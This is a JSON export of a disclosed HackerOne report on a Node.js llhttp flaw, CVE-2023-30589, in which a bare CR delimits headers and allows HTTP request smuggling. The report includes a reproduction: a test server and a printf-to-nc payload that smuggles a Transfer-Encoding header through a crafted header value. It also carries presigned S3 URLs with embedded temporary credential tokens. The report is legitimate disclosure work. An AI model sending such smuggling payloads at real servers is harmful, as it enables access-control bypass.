{
  "id": 2032842,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDMyODQy",
  "url": "https://hackerone.com/reports/2032842",
  "title": "HTTP Request Smuggling via Empty headers separated by CR",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-06-21T02:32:11.615Z",
  "submitted_at": "2023-06-21T02:33:13.723Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "yadhukrishnam",
    "url": "/yadhukrishnam",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7M54J673%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143732Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2FaXkHLiTu6JAlK%2F%2FJnx7CoOwtccnG75tgpYUKRnE3xgIhANREYBTpCaW3JM29ZZx8LW0d5%2BVqFzsx8ObXtUngWgMGKrEFCHcQAxoMMDEzNjE5Mjc0ODQ5IgzwBTCJ7KBGPnaqS%2FQqjgW%2BcrdfIx%2FSKxGuk6AHYcF%2FIRcvLyvZdIzwBqUcKAjP1Ior%2FMqJ33yw8cq8JXOrhT3SiP%2FwM%2Bu53Kuxy8H4MN5GBSEgiuQuG9nlkTsMSDNUsrTzPunwnriT%2BxkmzARMn5ZVPc%2BhTCcYbRF8UjxBFk0hq%2FmJsuMpTaHx7%2Fxrx6%2BPmTQBxbg23iAZF%2Fmgez%2FQ2HU40CJkcQww3886u2Rv%2FTY1NnCacfJtgYyToNbHWjQSUBN3BTsjWMDL5iQrcaeEmy9jTN1cBb5E%2BthOTBZ52d8dKMXI7EfAJmd2jsi0Ux8bAoDIgy8SrRd%2F0A0Nt6YeJJIm4VnVuWJ7wMWhQYMqhXPTxbxr2ANUslwzc%2BlOd39q7aLj1zAc5w3OnoZ9C74gcepXCJ92JP9%2FQDVjhiP2vXnj77JhlvEBMSJ1sDVGA3bzPKweK9dO5kmudF8K0gLugT2w7mboMx%2BWUEL94bfsth5Cr3%2BxRK%2FmDk1N8drxhcqT9pEoB7uhRHWjm5DjKzhxX%2FxpNEKuBgcBT%2FS5Q36%2FEBBcqdj8XuOl6U67CloKyunrrCSLhTFUaFHWCV%2BD%2BTNnGJ6jCn6%2Bd6OPn%2FZfKFCmhesLQicESfEP7vHbPUbnJ3tEwrS2UXMYBpH7KGj%2FTtPckuJyKgqLNn3Oq8VDPuJQVEMHRZweP%2Fakpvr8i2%2FNvwEQ8cCR7afoYqwI4zdKjqJgB7gULg3g2%2BTI6Swrsk3ygociks6FlHqYrBQ1Ic7elsq7b59POu8SYbpJd22D27eMK20HZzu7e%2FQOFeAELWUavctR67eOKXgPPOtktzshLAVvQU7CsYPcMEKxXdEEDesgLF%2By25RCmxQ7TW%2FnC04UIMsikew1kVRdz695f3pAIREw9eetrgY6sAFt5e%2FgBb3z6GUCPSY%2BbSpvu9318kCiOKXdmT8p52LNQRSkPxHFLhbrjTKuUqpurg1d3yQ%2B54ohHL%2FGB2jRPrX7qid5WdlXO42XDSEK0e2DQkICwpWfF9dhPwkvWoqnjmBr%2BZqGJOAD%2BDKfqMr9EVwgYEKWaPjJYoY9K5062IbgoYAcuYAxM2I2rDtSBCHlbaJlRKGx9j2%2FOO74MzSF65C7Em0o7VM2NP6pIOsd16f4tQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=14f5e108a54de7f1b32e767093ba63926211cfc27531ff536a9b2c76b69dbf58",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7M54J673%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143732Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD%2FaXkHLiTu6JAlK%2F%2FJnx7CoOwtccnG75tgpYUKRnE3xgIhANREYBTpCaW3JM29ZZx8LW0d5%2BVqFzsx8ObXtUngWgMGKrEFCHcQAxoMMDEzNjE5Mjc0ODQ5IgzwBTCJ7KBGPnaqS%2FQqjgW%2BcrdfIx%2FSKxGuk6AHYcF%2FIRcvLyvZdIzwBqUcKAjP1Ior%2FMqJ33yw8cq8JXOrhT3SiP%2FwM%2Bu53Kuxy8H4MN5GBSEgiuQuG9nlkTsMSDNUsrTzPunwnriT%2BxkmzARMn5ZVPc%2BhTCcYbRF8UjxBFk0hq%2FmJsuMpTaHx7%2Fxrx6%2BPmTQBxbg23iAZF%2Fmgez%2FQ2HU40CJkcQww3886u2Rv%2FTY1NnCacfJtgYyToNbHWjQSUBN3BTsjWMDL5iQrcaeEmy9jTN1cBb5E%2BthOTBZ52d8dKMXI7EfAJmd2jsi0Ux8bAoDIgy8SrRd%2F0A0Nt6YeJJIm4VnVuWJ7wMWhQYMqhXPTxbxr2ANUslwzc%2BlOd39q7aLj1zAc5w3OnoZ9C74gcepXCJ92JP9%2FQDVjhiP2vXnj77JhlvEBMSJ1sDVGA3bzPKweK9dO5kmudF8K0gLugT2w7mboMx%2BWUEL94bfsth5Cr3%2BxRK%2FmDk1N8drxhcqT9pEoB7uhRHWjm5DjKzhxX%2FxpNEKuBgcBT%2FS5Q36%2FEBBcqdj8XuOl6U67CloKyunrrCSLhTFUaFHWCV%2BD%2BTNnGJ6jCn6%2Bd6OPn%2FZfKFCmhesLQicESfEP7vHbPUbnJ3tEwrS2UXMYBpH7KGj%2FTtPckuJyKgqLNn3Oq8VDPuJQVEMHRZweP%2Fakpvr8i2%2FNvwEQ8cCR7afoYqwI4zdKjqJgB7gULg3g2%2BTI6Swrsk3ygociks6FlHqYrBQ1Ic7elsq7b59POu8SYbpJd22D27eMK20HZzu7e%2FQOFeAELWUavctR67eOKXgPPOtktzshLAVvQU7CsYPcMEKxXdEEDesgLF%2By25RCmxQ7TW%2FnC04UIMsikew1kVRdz695f3pAIREw9eetrgY6sAFt5e%2FgBb3z6GUCPSY%2BbSpvu9318kCiOKXdmT8p52LNQRSkPxHFLhbrjTKuUqpurg1d3yQ%2B54ohHL%2FGB2jRPrX7qid5WdlXO42XDSEK0e2DQkICwpWfF9dhPwkvWoqnjmBr%2BZqGJOAD%2BDKfqMr9EVwgYEKWaPjJYoY9K5062IbgoYAcuYAxM2I2rDtSBCHlbaJlRKGx9j2%2FOO74MzSF65C7Em0o7VM2NP6pIOsd16f4tQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=943223c0d86aa142a6b37db4d19401db5731125b14a75c0b37754370eb75a570"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-30589"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-08-28T14:53:27.090Z",
  "bug_reporter_agreed_on_going_public_at": "2023-07-29T14:53:22.569Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "This report was originally submitted here: https://hackerone.com/reports/2001873\n\n---\n\n\n**Summary:** \nThe `llhttp` parser in the http module in Node v20.2.0 does not strictly use the CRLF sequence to delimit HTTP requests. This can lead to HTTP Request Smuggling (HRS).\n\n**Description:** \nThe CR character (without LF) is sufficient to delimit HTTP header fields in the llhttp parser. According to RFC7230 section 3, only the CRLF sequence should delimit each header-field.\n\n## Steps To Reproduce:\n\n*Server:*\n```javascript\nconst http = require(\"http\");\nhttp\n  .createServer((request, response) => {\n    let body = [];\n    request\n      .on(\"error\", (err) => {\n        response.end(\"Request Error: \" + err);\n      })\n      .on(\"data\", (chunk) => {\n        body.push(chunk);\n      })\n      .on(\"end\", () => {\n        body = Buffer.concat(body).toString();\n        // log the body to stdout to catch the smuggled request\n        console.log(\"Response\");\n        console.log(request.headers);\n        console.log(body);\n        console.log(\"---\");\n        response.on(\"error\", (err) => {\n          // log the body to stdout to catch the smuggled request\n          response.end(\"Response Error: \" + err);\n        });\n        response.end(\n          \"Body length: \" + body.length.toString() + \" Body: \" + body\n        );\n      });\n  })\n  .listen(5000);\n```\n*Payload:*\n1. Execute the below command.\n```shell\nprintf \"POST / HTTP/1.1\\r\\n\"\\\n             \"Host: localhost:5000\\r\\n\"\\\n             \"X-Abc:\\rxTransfer-Encoding: chunked\\r\\n\"\\\n             \"\\r\\n\"\\\n             \"1\\r\\n\"\\\n             \"A\\r\\n\"\\\n             \"0\\r\\n\"\\\n             \"\\r\\n\" | nc localhost 5000\n```\n2. Note that the value of `X-Abc` header in the request is - `[\\r]xTransfer-Encoding: chunked[\\r\\n]`\n3. The llhttp library parses this as a `Transfer-Encoding: chunked` header.\n```\nResponse\n{ host: 'localhost:5000', 'x-abc': '', 'transfer-encoding': 'chunked' }\nA\n---\n```\n*Note:*\n1. The next character to `\\r` is missing in the parsed header name.\n2.  This test case is missing from https://github.com/nodejs/llhttp/blob/main/test/request/invalid.md.\nA frontend proxy that does not consider `\\r` as termination of an HTTP header value, could forward this to a backend, causing an HRS. \n\n## Supporting Material/References:\nThis report is similar to:\n  * https://hackerone.com/reports/1888760\n\n## Impact\n\nHTTP Request Smuggling can lead to Access Control Bypass",
  "bounty_amount": "1800.0",
  "formatted_bounty": "$1,800",
  "weakness": {
    "id": 86,
    "name": "HTTP Request Smuggling"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-08-28T14:53:22.651Z",
  "allow_singular_disclosure_after": -14600649.5058451,
  "singular_disclosure_allowed": true,
  "vote_count": 14,
  "voters": [
    "shreyaschavhan",
    "n1m0",
    "zy9ard3",
    "apapedulimu",
    "yadhukrishnam",
    "salman_hunted",
    "sawesx01",
    "testwlp",
    "desmond574",
    "tom-kruise",
    "and 4 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.5,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 83651,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 313089,
      "category": "team",
      "content": "The llhttp parser in the http module in Node.js does not strictly use the CRLF sequence to delimit HTTP requests. This can lead to HTTP Request Smuggling (HRS).\n\nThe CR character (without LF) is sufficient to delimit HTTP header fields in the llhttp parser. According to RFC7230 section 3, only the CRLF sequence should delimit each header-field.\n\nThis vulnerability impacts all Node.js active versions: v16, v18, and, v20.",
      "user": {
        "id": 2032618,
        "username": "pr0tag0nist",
        "name": "Sandeep Singh",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2021-10-18T10:02:41.859Z",
        "url": "https://hackerone.com/pr0tag0nist",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png",
          "xtralarge": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
